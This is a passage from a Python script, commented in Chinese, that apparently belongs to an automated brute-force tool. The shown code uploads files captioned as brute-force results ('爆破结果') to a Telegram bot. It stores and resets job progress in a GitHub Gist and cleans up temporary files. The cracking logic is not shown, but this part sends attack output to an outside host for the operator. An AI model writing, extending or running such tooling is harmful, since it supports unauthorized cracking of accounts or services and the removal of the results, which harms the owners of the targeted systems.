                if not bot_token or not chat_id: return
                if not os.path.exists(file_path): return
                print(f"📤 正在将 {file_path} 上传至 Telegram ...")
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                with open(file_path, "rb") as f:
                    files = {'document': f}
                    data = {'chat_id': chat_id, 'caption': f"爆破结果：{os.path.basename(file_path)}"}
                    try:
                        response = requests.post(url, data=data, files=files, timeout=60)
                        if response.status_code == 200: print(f"✅ 文件 {file_path} 已发送到 Telegram")
                        else: print(f"❌ TG上传失败，状态码：{response.status_code}，返回：{response.text}")
                    except Exception as e: print(f"❌ 发送到 TG 失败：{e}")

            for final_name in final_result_files.values():
                send_to_telegram(final_name, BOT_TOKEN, CHAT_ID)
            
            print(f"ℹ️ 正在清理 Gist 中的进度文件 '{PROGRESS_FILE_NAME}'...")
            update_gist_file(GIST_ID, GITHUB_TOKEN, PROGRESS_FILE_NAME, "{}")

    except Exception as e:
        print(f"❌ 脚本执行过程中发生致命错误: {e}")
        update_gist_file(GIST_ID, GITHUB_TOKEN, PROGRESS_FILE_NAME, json.dumps(progress_data, indent=2))
        sys.exit(1)
    finally:
        clean_temp_files()
        end = time.time()
        cost = int(end - JOB_START_TIME)
        print(f"\n=== 本次作业运行结束！用时 {cost // 60} 分 {cost % 60} 秒 ===")
